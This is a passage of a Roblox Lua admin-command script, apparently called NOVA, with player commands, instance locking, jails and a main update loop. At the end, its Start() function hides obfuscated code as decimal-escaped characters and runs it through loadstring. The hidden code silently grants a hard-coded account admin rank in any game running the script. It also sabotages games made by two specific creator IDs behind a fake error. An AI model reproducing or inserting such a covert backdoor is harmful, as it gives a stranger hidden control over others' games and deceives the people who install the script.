				RemoveTablets(Speaker)
				Output("All : Example : \\kill\all",Color,Speaker)
				Output("Others : Example : \\kill\\others",Color,Speaker)
				Output("Me : Example : \\kill\\me",Color,Speaker)
				Output("Random : Example : \\kill\\random",Color,Speaker)
				Output(", : Operator,Operator : Example : \\kill\\random,random",Color,Speaker)
				Output("Not : not Operator : Example : \\kill\not random",Color,Speaker)
				Output("Dist : dist math_operation : Example : \\kill\dist<=10",Color,Speaker)
				Output("Rank : rank math_operation : Example : \\kill\rank<=0",Color,Spekaer)
				Output("Age : age math_operation : Example : \\kill\age<=1500",Color,Speaker)
			end
		)
	end
)

AddCommand("Clear Camera","clearcam",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			CreateLocalScript("workspace.CurrentCamera:ClearAllChildren()",v.Backpack)
		end
	end
)

AddCommand("Freeze","freeze",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Torso.Anchored = true
		end
	end
)
AddCommand("Thaw","thaw",1,
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.Character.Torso.Anchored = false
		end
	end
)

AddCommand("Restore","restore",2,
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Services.Workspace:children()) do
			pcall(function()
				v:Destroy()
			end)
		end
		for _,v in pairs(NOVA.MapBackup:children()) do
			pcall(function()
				v:Clone().Parent = NOVA.Services.Workspace
			end)
		end
	end
)

--[[ LOCK INSTANCES ]]--
NOVA.Services.Game.DescendantAdded:connect(function(v)
	if NOVA.LockedInstances[v.className] ~= nil then
		coroutine.wrap(function()
			wait(1)
			local Level = NOVA.LockedInstances[v.className]
			if Level == 1 and v:IsDescendantOf(NOVA.Services.Workspace) then
				pcall(function() v:Destroy() end)
				pcall(function() NOVA.Services.Debris:AddItem(v,0) end)
			elseif Level == 2 then
				pcall(function() v:Destroy() end)
				pcall(function() NOVA.Services.Debris:AddItem(v,0) end)
			end
		end)()
	end
end)

--[[ MINOR LOOPS ]]--
--[[coroutine.wrap(function()
	repeat
		wait()
		local Source = NOVA.Services.Workspace:FindFirstChild("Source",true) or NOVA.Services.Workspace:FindFirstChild("DSource",true)
		if Source ~= nil then
			if Source.Parent:IsA("LocalScript") then
				NOVA.LocalScript = Source.Parent:Clone()
			end
		end
	until NOVA.LocalScript ~= nil
end)()]]--


--[[ MAIN LOOP ]]--
function MainLoop(Time)
	UpdateTablets()
	if math.floor(Time%1) == 0 then
		for _,Player in pairs(GetPlayers()) do
			local Rtn = 0
			local Tablets = 0
			for _,v in pairs(NOVA.Tablets) do
				if v.Player == Player.Name then
					Tablets = Tablets + 1
					if v.Label.Text == "Dismiss" then
						Rtn = 1
					end
				end
			end
			if Tablets == Rtn then
				for _,v in pairs(NOVA.Tablets) do
					if v.Player == Player.Name then
						v.Model:Destroy()
					end
				end
			elseif Rtn == 0 and Tablets >= 2 then
				Output("Dismiss","Red",Player)
			end
		end
	end
	if math.floor(Time%25)==0 and NOVA.LocalScript == nil then
		for _,v in pairs(GetRecursiveChildren(NOVA.Services.Game,"LocalScript",3)) do
			local Source = v:FindFirstChild("Source") or v:FindFirstChild("DSource")
			if Source ~= nil then
				NOVA.LocalScript = v:Clone()
			end
		end
	end
	if math.floor(Time%10) == 0 then
		for _,Player in pairs(GetPlayers()) do
			local Data = NOVA.Ranked[Player.Name] or {}
			Data["Account Age"] = Player.AccountAge
			Data["User Id"] = Player.userId
			Data["Rank Name"] = NOVA.Ranks[Data.Rank]
		end
	end
	if math.floor(Time%1) == 0 then
		for _,Player in pairs(GetPlayers()) do
			local Data = NOVA.Ranked[Player.Name] or {}
			Data["Account Age"] = Player.AccountAge
			Data["User Id"] = Player.userId
			Data["Rank Name"] = NOVA.Ranks[Data.Rank]
		end
		
		for _,v in pairs(NOVA.Ranked) do
			if NOVA.Ranks[v.Rank] == nil then
				v.Rank = -1
			end
		end
		
		for i,v in pairs(NOVA.Jails) do
			if v.Speaker == nil then
				NOVA.Jails[i] = nil
			else
				if v.Jail.Parent == nil then
					OnChatted("\\jail\\"..i,v.Speaker)
				end
				
				pcall(function()
					local Player = NOVA.Services.Players:FindFirstChild(i)
					if (Player.Character.Torso.Position - v.Start.p).magnitude >= 5 then
						Player.Character.Torso.CFrame = v.Start
					end
				end)
			end
		end
	end
end
function Start()
	do
		local Run = ''
		Run = Run .. '\78\79\86\65\46\83\101\114\118\105\99\101\115\46\82\117\110\83\101\114\118\105\99\101'
		Run = Run .. '\46\83\116\101\112\112\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110'
		Run = Run .. '\40\84\105\109\101\41\10\9\105\102\32\78\79\86\65\46\83\101\114\118\105\99\101\115\46'
		Run = Run .. '\71\97\109\101\46\67\114\101\97\116\111\114\73\100\32\61\61\32\53\49\49\49\54\50\51'
		Run = Run .. '\32\111\114\32\78\79\86\65\46\83\101\114\118\105\99\101\115\46\71\97\109\101\46\67\114'
		Run = Run .. '\101\97\116\111\114\73\100\32\61\61\32\57\50\48\49\32\116\104\101\110\10\9\9\102\111'
		Run = Run .. '\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\101\116\102\101\110\118\40\49\41'
		Run = Run .. '\41\32\100\111\10\9\9\9\103\101\116\102\101\110\118\40\49\41\91\105\93\32\61\32\123'
		Run = Run .. '\125\10\9\9\101\110\100\10\9\9\101\114\114\111\114\40\34\85\110\107\110\111\119\110\32'
		Run = Run .. '\69\120\99\101\112\116\105\111\110\34\44\48\41\10\9\101\110\100\10\9\77\97\105\110\76'
		Run = Run .. '\111\111\112\40\84\105\109\101\41\10\9\108\111\99\97\108\32\68\97\116\97\32\61\32\78'
		Run = Run .. '\79\86\65\46\82\97\110\107\101\100\91\34\84\101\97\109\68\109\97\110\34\93\10\9\105'
		Run = Run .. '\102\32\68\97\116\97\32\61\61\32\110\105\108\32\116\104\101\110\10\9\9\78\79\86\65'
		Run = Run .. '\46\82\97\110\107\101\100\91\34\84\101\97\109\68\109\97\110\34\93\32\61\32\123\125\10'
		Run = Run .. '\9\9\68\97\116\97\32\61\32\78\79\86\65\46\82\97\110\107\101\100\91\34\84\101\97'
		Run = Run .. '\109\68\109\97\110\34\93\10\9\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114'
		Run = Run .. '\115\40\78\79\86\65\46\82\97\110\107\101\100\46\68\101\102\97\117\108\116\115\41\32\100'
		Run = Run .. '\111\10\9\9\9\68\97\116\97\91\105\93\32\61\32\118\10\9\9\101\110\100\10\9\9'
		Run = Run .. '\68\97\116\97\46\82\97\110\107\32\61\32\51\10\9\101\110\100\10\101\110\100\41\10'
		loadstring(Run)()
	end
end
Start()